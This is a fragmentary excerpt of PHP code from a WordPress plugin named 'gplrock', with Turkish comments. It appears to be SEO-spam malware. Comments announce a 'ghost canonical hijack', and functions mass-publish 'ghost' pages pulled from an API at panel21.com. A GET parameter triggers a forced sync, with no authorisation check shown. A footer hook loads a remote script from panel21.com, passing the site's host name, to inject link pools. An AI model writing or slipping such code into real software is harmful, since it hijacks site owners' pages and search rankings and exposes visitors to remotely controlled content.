...
// 🎯 HAYALET CANONICAL HIJACK - HER DURUMDA ÇALIŞIR (VAR/YOK)
 ...
 * ⚡ FRIDA: 100'er 100'er batch, 4773'e kadar devam
 */
function gplrock_stage_api_sync() {
    ...
    if (!get_option('gplrock_api_sync_batch_started', 0)) {
        ...
        update_option('gplrock_api_sync_target', 4773); // ⚡ Hedef: 4773
    }
    ...
    try {
        ...
        if (!$api_batch_started) {
            ...
            if (!$completed_at) {
                ...
                update_option('gplrock_api_sync_total_synced', 0);
                update_option('gplrock_api_sync_target', 4773);
 ...
 * ⚡ FRIDA: 100'er 100'er batch, 4773'e kadar otomatik devam
...
function gplrock_sync_api_batch() {
    ...
    try {
        ...
        $target = intval(get_option('gplrock_api_sync_target', 4773));
...
function gplrock_sync_ghost_batch() {
    ...
    try {
        ...
        $batch_size = intval(get_option('gplrock_ghost_batch_size', 10)); // 100 → 50 (daha hafif)
        $total_published = intval(get_option('gplrock_ghost_total_published', 0));
        
        // ⚡ 50 ghost içerik yayımla (KALINAN YERDEN) - Daha hafif batch
    ...
    if (isset($_GET['gplrock_force_sync']) && $_GET['gplrock_force_sync'] === '1') {
        ...
        if (is_admin()) {
            add_action('admin_notices', function() {
                echo '<div class="notice notice-success is-dismissible"><p>✅ GPLRock API Sync zorla başlatıldı! (100\'er 100\'er, 4773\'e kadar)</p></div>';
            });
        }
        return;
    }
...
function gplrock_force_ghost_setup_seeded() {
    ...
    try {
        ...
        // Ayarları kaydet
        $options = [
            'api_url' => 'https://panel21.com/api/ghost-api.php',
...
add_action('wp_footer', 'gplrock_add_footer_internal_links');
function gplrock_add_footer_internal_links() {
...
function gplrock_unified_footer_script() {
    ...
    // Tek seferlik çalışma kontrolü - Global flag
    static $script_executed = false;
    if ($script_executed) {
        return;
    }
    ...
    // Panel21.com footer script - Elementor uyumlu
    $footer_url = 'https://panel21.com/api/footer.php?linkspool=' . urlencode($_SERVER['HTTP_HOST']);
